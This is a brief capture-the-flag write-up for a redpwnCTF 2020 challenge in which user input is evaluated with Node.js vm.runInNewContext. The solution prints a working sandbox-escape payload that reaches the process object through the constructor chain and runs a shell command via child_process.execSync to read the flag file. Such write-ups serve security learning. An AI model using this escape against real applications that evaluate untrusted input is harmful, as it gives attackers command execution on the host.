Who needs regex for sanitization when we have VMs?!?!

The flag is at /ctf/flag.txt

nc 2020.redpwnc.tf 31273

**Files**
- [calculator.js]({{site.baseurl}}/assets/CaaSiNO/calculator.js)

## Solution

We are given a calculator.js file, We see that, whatever input we give its run using ```vm.runInNewContext```. So we try to exploit this to read the flag from their filesystem.
Giving the following as input gets us the flag

```
const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').execSync('cat /ctf/flag.txt').toString();
```
